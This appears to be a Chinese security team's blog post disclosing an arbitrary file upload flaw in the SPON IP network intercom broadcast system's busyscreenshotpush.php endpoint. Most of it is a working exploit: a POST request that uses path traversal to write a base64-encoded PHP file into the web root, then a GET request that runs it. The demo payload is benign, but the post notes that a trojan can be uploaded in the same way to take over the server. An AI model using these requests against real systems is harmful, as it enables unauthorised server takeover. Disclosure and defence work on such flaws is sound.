#  世邦通信SPON IP网络对讲广播系统busyscreenshotpush.php 接口处存在文件上传漏洞   
原创 R0seK1ller  蟹堡安全团队   2024-08-06 23:59  
  
## 1. 漏洞描述  
  
	  
    世邦通信 SPON IP网络对讲广播系统 busyscreenshotpush.php 存在任意文件上传漏洞，攻击者可以通过漏洞上传任意文件甚至木马文件，从而获取服务器权限。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWkicQxOPON5a5MyqeLDa2OKxTgCiaZEJiaWHMfNJhpLoe2u9P5j9E9OibjmMATibfCyq3ZIqVu4BDBBIA/640?wx_fmt=png&from=appmsg "")  
## 2. 漏洞复现  
```
POST /php/busyscreenshotpush.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)
Content-Length: 215
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Connection: close

jsondata[caller]=1&jsondata[callee]=../../../../../ICPAS/Wnmp/WWW/php/&jsondata[imagename]=1_2_test.php&jsondata[imagecontent]=PD9waHAgZWNobyAnT3RFWHkwSVJncExWMzkxdzNSUzd5OVR5U1BGM1dVeDAnO3VubGluayhfX0ZJTEVfXyk7Pz4=

```  
  
  
jsondata[imagecontent]的参数是经过base64编码的，在此处以以下代码为例：  
> <  
?php echo 'OtEXy0IRgpLV391w3RS7y9TySPF3WUx0';unlink(  
_  
_  
FILE  
_  
_  
);?>  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWkicQxOPON5a5MyqeLDa2OKwogsknha6PDQ5LTBBibBUve0GE6dG46aiaSN5F2bMbhmh7f5XviaAUl0A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWkicQxOPON5a5MyqeLDa2OKtIHyDM1AOS9FIlmBaCv5b39DPKwibicGD9ibdbXtf8N6Fiar2Lvkm35F6A/640?wx_fmt=png&from=appmsg "")  
  
	  
显示"{"res":"1"}"，即为上传成功，上传成功后访问/php/1_2_test.php，查看文件是否上传成功，文件是否能够解析。  
```
GET /php/1_2_test.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)
Content-Length: 0
Accept-Encoding: gzip, deflate, br
Connection: close


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWkicQxOPON5a5MyqeLDa2OKTaqlzWaDFYHy0sp6KBLj90q3wiamjBic5ricliadLlHWcHvaticwziayoJMQ/640?wx_fmt=png&from=appmsg "")  
  
成功执行echo OtEXy0IRgpLV391w3RS7y9TySPF3WUx0，并输出返回信息。  
  
  
